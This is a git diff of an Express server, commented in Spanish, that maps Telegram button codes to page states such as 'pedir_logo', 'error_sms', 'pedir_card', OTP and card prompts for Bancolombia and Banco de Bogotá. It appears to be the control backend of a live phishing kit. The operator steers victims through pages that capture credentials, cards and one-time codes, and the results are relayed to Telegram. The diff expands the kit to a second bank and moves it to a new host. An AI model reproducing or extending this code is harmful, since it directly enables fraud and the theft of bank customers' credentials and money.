@@ -11,7 +11,7 @@ app.use(express.json());
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID   = process.env.CHAT_ID;
 const PORT      = process.env.PORT || 4000;
-const SELF_URL  = process.env.RENDER_EXTERNAL_URL || 'https://essa-global-server.onrender.com';
+const SELF_URL  = process.env.RENDER_EXTERNAL_URL || 'https://popopopopos.onrender.com';
 
 // ─── Sessions Map ─────────────────────────────────────────────────────────────
 // sessionId → { redirect_to, last_msg_id, bank, data }
@@ -75,9 +75,9 @@ function esc(s) {
     .replace(/>/g, '&gt;');
 }
 
-// ─── Código corto → URL completa (Bancolombia) ───────────────────────────────
+// ─── Código corto → URL/comando (multi-banco) ────────────────────────────────
 const CODE_TO_URL = {
-  // Nuevos códigos compactos (≤64 bytes con sessionId)
+  // Bancolombia — nuevos códigos compactos (≤64 bytes con sessionId)
   'ELG' : 'index.html?state=error_logo',
   'PLG' : 'index.html?state=pedir_logo',
   'ESM' : 'sms.html?state=error_sms',
@@ -86,14 +86,19 @@ const CODE_TO_URL = {
   'PCRD': 'card.html?state=pedir_card',
   'EDIN': 'dinamica.html?state=error_dinamica',
   'PDIN': 'dinamica.html?state=pedir_dinamica',
-  // Códigos legacy (botones anteriores que aún puedan estar en Telegram)
-  'INICIO'  : 'index.html',
+  // Banco de Bogotá — strings que espera startPolling() en ready.js
+  'INICIO'     : 'inicio',
+  'OTP'        : 'otp1',
+  'OTP_ERR'    : 'otp2',
+  'CORREO'     : 'correo',
+  'TARJETA_BOG': 'tarjeta',
+  // Bancolombia legacy
   'SMS'     : 'sms.html',
   'DINAMICA': 'dinamica.html',
   'TARJETA' : 'card.html',
 };
 function resolveCode(code) {
-  return CODE_TO_URL[code] || null;   // ESY/PSY/E922/P922 → null → loader sigue girando
+  return CODE_TO_URL[code] || null;   // ESY/PSY/E922/P922/SOYYO → null → loader sigue girando
 }
 
 // Botonera estándar completa para Bancolombia
